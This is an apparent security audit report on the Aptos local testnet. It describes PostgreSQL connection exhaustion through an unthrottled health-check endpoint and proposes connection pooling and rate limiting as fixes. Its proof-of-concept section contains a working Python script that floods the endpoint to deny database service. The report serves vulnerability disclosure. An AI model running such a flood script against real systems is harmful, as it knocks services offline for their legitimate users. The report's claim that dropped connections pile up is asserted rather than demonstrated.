# Audit Report

## Title
PostgreSQL Connection Pool Exhaustion via Ready Server Health Check Endpoint

## Summary
The local testnet's ready server health check endpoint creates a new PostgreSQL connection on every HTTP request without connection pooling or rate limiting. An attacker can exhaust the PostgreSQL `max_connections` limit by flooding the ready server endpoint, causing denial of service for legitimate database users including processors and the indexer API.

## Finding Description

The vulnerability exists in the interaction between two components:

1. **Health Check Implementation**: The `HealthChecker::Postgres` variant creates a new database connection on every invocation without any connection pooling or reuse. [1](#0-0) 

2. **Ready Server Endpoint**: The ready server exposes an HTTP endpoint that calls `check()` on all health checkers, including the Postgres health checker, on every incoming HTTP request. [2](#0-1) 

**Attack Flow:**

1. The local testnet ready server binds to a configurable address (defaults to 127.0.0.1, but can be set to 0.0.0.0 via `--bind-to`) [3](#0-2) 

2. An attacker sends rapid HTTP GET requests to `http://<bind_address>:8070/`

3. Each request triggers the `root` handler which iterates through all health checkers and calls `check()` on each one

4. For the Postgres health checker, this executes `AsyncPgConnection::establish(connection_string)`, creating a new TCP connection to PostgreSQL

5. The connection is immediately dropped after the establish call, but cleanup is not instantaneous due to:
   - Async Drop limitations in Rust (Drop trait is synchronous but connection cleanup requires async operations)
   - TCP connection state management (TIME_WAIT, FIN_WAIT states)
   - PostgreSQL connection tracking overhead

6. If requests arrive faster than connections can be cleaned up, active connections accumulate and eventually exhaust PostgreSQL's `max_connections` limit (typically 100 by default)

7. Once exhausted, legitimate database users (processors, indexer API, other services) receive "too many connections" errors and cannot connect

**Broken Invariant:**
This violates the **Resource Limits** invariant (#9): "All operations must respect gas, storage, and computational limits." The health check mechanism fails to respect database connection limits, allowing unbounded resource consumption.

## Impact Explanation

This is a **Medium Severity** vulnerability per the Aptos bug bounty criteria:

- **Limited DoS Impact**: The attack causes denial of service for database-dependent components (processors, indexer API) but does not affect the core blockchain consensus or validator operations
- **Scope**: Only impacts local testnet deployments with the indexer API enabled (`--with-indexer-api` flag)
- **Recovery**: The impact is temporary - stopping the attack allows connections to drain and services to recover
- **No Fund Loss**: No direct theft or manipulation of funds, but disrupts indexer functionality which some applications depend on

The attack does not meet High or Critical severity because:
- It doesn't affect consensus or validator nodes directly
- It's limited to local testnet environments (not production mainnet)
- Recovery doesn't require intervention beyond stopping the attack
- No permanent state corruption or fund loss occurs

## Likelihood Explanation

**Likelihood: High** when the ready server is exposed beyond localhost.

**Factors increasing likelihood:**
1. **Ease of Exploitation**: Extremely simple - requires only HTTP GET requests, no authentication or special privileges
2. **Default Configuration**: While the default binding is 127.0.0.1 (localhost), the `--bind-to` flag allows binding to 0.0.0.0, exposing the endpoint to the network
3. **No Rate Limiting**: The endpoint has no built-in rate limiting or connection throttling
4. **No Authentication**: The ready server endpoint is completely unauthenticated
5. **Rapid Requests**: Modern HTTP clients can easily send hundreds of requests per second

**Factors decreasing likelihood:**
1. **Local Testnet Only**: This primarily affects local development environments, not production deployments
2. **Default Localhost Binding**: By default, the endpoint is only accessible from localhost
3. **Awareness**: Developers running exposed local testnets may be aware of security implications

## Recommendation

**Immediate Fix - Add Connection Pooling:**

Replace direct `AsyncPgConnection::establish()` calls with a connection pool. Use `bb8` which is already available as a diesel-async feature:

```rust
// In health_checker.rs, create a connection pool manager
use diesel_async::pooled_connection::{AsyncDieselConnectionManager, bb8::Pool};

// Store pool instead of connection string
pub enum HealthChecker {
    Postgres(Pool<AsyncPgConnection>),
    // ... other variants
}

// In check() method
HealthChecker::Postgres(pool) => {
    let mut connection = pool.get().await
        .context("Failed to get connection from pool")?;
    // Test the connection with a simple query
    diesel::sql_query("SELECT 1")
        .execute(&mut connection)
        .await
        .context("Failed to execute health check query")?;
    Ok(())
}
```

**Additional Recommendations:**

1. **Rate Limiting**: Add rate limiting to the ready server endpoint using token bucket or similar algorithm
2. **Authentication**: Consider adding basic authentication for the ready server endpoint when exposed
3. **Connection Timeout**: Set aggressive timeouts on health check connections
4. **Monitoring**: Add metrics for connection pool utilization and health check frequency
5. **Documentation**: Clearly document the security implications of exposing the ready server with `--bind-to 0.0.0.0`

## Proof of Concept

**Attack Script (Python):**

```python
#!/usr/bin/env python3
import asyncio
import aiohttp
import time

async def send_request(session, url, request_num):
    try:
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as response:
            status = response.status
            print(f"Request {request_num}: {status}")
    except Exception as e:
        print(f"Request {request_num} failed: {e}")

async def attack(target_url, num_requests, concurrency):
    """
    Flood the ready server endpoint with health check requests
    to exhaust PostgreSQL connections.
    """
    connector = aiohttp.TCPConnector(limit=concurrency)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for i in range(num_requests):
            task = asyncio.create_task(send_request(session, target_url, i))
            tasks.append(task)
            # Small delay to avoid overwhelming the client
            if i % concurrency == 0:
                await asyncio.sleep(0.01)
        
        await asyncio.gather(*tasks, return_exceptions=True)

async def main():
    # Target the ready server endpoint
    target_url = "http://127.0.0.1:8070/"
    
    print(f"Starting connection exhaustion attack on {target_url}")
    print("This will create a new PostgreSQL connection for each request")
    print("Monitor PostgreSQL with: SELECT count(*) FROM pg_stat_activity;")
    
    # Send 500 concurrent requests to exhaust typical max_connections=100
    await attack(target_url, num_requests=500, concurrency=50)
    
    print("\nAttack complete. Check PostgreSQL connection count:")
    print("psql -c 'SELECT count(*) FROM pg_stat_activity;'")
    print("\nTry connecting to the database - you should see 'too many connections' errors")

if __name__ == "__main__":
    asyncio.run(main())
```

**Test Setup:**

1. Start local testnet with indexer API and exposed ready server:
```bash
aptos node run-localnet --with-indexer-api --bind-to 0.0.0.0
```

2. Monitor PostgreSQL connections (in separate terminal):
```bash
watch -n 1 'psql -U postgres -c "SELECT count(*) FROM pg_stat_activity;"'
```

3. Run the attack script:
```bash
python3 attack_ready_server.py
```

4. Observe:
   - PostgreSQL connection count rapidly increases
   - When max_connections is reached, legitimate services fail with "too many connections" errors
   - Processors and indexer API become unavailable

**Expected Result:**
Within seconds, PostgreSQL's `max_connections` limit is exhausted, causing denial of service for all database-dependent services in the local testnet.

## Notes

This vulnerability is specific to the local testnet implementation and does not affect production Aptos nodes or the main blockchain network. However, developers running exposed local testnets for testing or development purposes are vulnerable if they expose the ready server endpoint to untrusted networks.

The root cause is the lack of connection pooling combined with an unauthenticated, unthrottled HTTP endpoint that triggers database connections. This pattern violates resource management best practices and should be addressed before local testnet environments are used in production-like scenarios.

### Citations

**File:** crates/aptos/src/node/local_testnet/health_checker.rs (L88-92)
```rust
            HealthChecker::Postgres(connection_string) => {
                AsyncPgConnection::establish(connection_string)
                    .await
                    .context("Failed to connect to postgres to check DB liveness")?;
                Ok(())
```

**File:** crates/aptos/src/node/local_testnet/ready_server.rs (L111-124)
```rust
async fn root(health_checkers: Data<&HealthCheckers>) -> impl IntoResponse + use<> {
    let mut ready = vec![];
    let mut not_ready = vec![];
    for health_checker in &health_checkers.health_checkers {
        // Use timeout since some of these checks can take quite a while if the
        // underlying service is not ready. This is best effort of course, see the docs
        // for tokio::time::timeout for more information.
        match timeout(Duration::from_secs(3), health_checker.check()).await {
            Ok(Ok(())) => ready.push(health_checker.clone()),
            _ => {
                not_ready.push(health_checker.clone());
            },
        }
    }
```

**File:** crates/aptos/src/node/local_testnet/mod.rs (L273-283)
```rust
        let running_inside_container = Path::new(".dockerenv").exists();
        let bind_to = match self.bind_to {
            Some(bind_to) => bind_to,
            None => {
                if running_inside_container {
                    Ipv4Addr::new(0, 0, 0, 0)
                } else {
                    Ipv4Addr::new(127, 0, 0, 1)
                }
            },
        };
```
